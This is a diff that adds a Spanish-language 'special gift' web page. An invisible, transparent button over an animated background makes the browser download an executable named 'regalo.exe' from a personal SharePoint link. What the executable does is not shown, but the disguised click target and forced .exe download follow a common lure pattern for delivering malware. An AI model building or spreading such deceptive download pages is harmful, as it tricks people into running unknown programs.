@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regalo Especial</title>
+    <style>
+        body {
+            background-image: url("RegaloEspecial.gif");
+            background-size: cover; /* Se adapta a la pantalla */
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-image 0.5s ease-in-out;
+            overflow: hidden;
+        }
+
+        button {
+            background-color: transparent;
+            color: transparent;
+            font-family: 'Comic Sans MS';
+            font-size: 58px;
+            padding: 60px 92px;
+            
+            position: absolute;
+            top: 50%;
+            left: 30%;
+            cursor: pointer;
+            outline: none; 
+            border: none; 
+            box-shadow: none;
+        }
+
+        /* Estilos para pantallas menores a 1600px */
+        @media (max-width: 1600px) {
+            body {
+                background-size: cover;
+            }
+            button {
+                font-size: 40px;
+                top: 70%;
+                left: 40%;
+            }
+        }
+
+        /* Estilos para pantallas menores a 480px */
+        @media (max-width: 480px) {
+            body {
+                background-image: url("RegaloEspecial2.gif");
+            }
+            button {
+                font-size: 9px; /* Ajustado para que siga siendo visible */
+                top: 55%;
+                left: 49%;
+                transform: translateX(-50%);
+            }
+        }
+    </style>5
+</head>
+<body>
+    
+s
+<button id="boton">Haz click</button>
+
+<script>
+    document.getElementById("boton").addEventListener("click", function() {
+        const enlace = document.createElement('a');
+            enlace.href = 'https://uadecedu-my.sharepoint.com/personal/mario_san_uadec_edu_mx/_layouts/15/download.aspx?SourceUrl=%2Fpersonal%2Fmario%5Fsan%5Fuadec%5Fedu%5Fmx%2FDocuments%2Fregalo%2Eexe';  // URL del archivo
+            enlace.download = 'regalo.exe'; 
+            enlace.click();  
+    });
+</script>
+
+</body>
+</html>
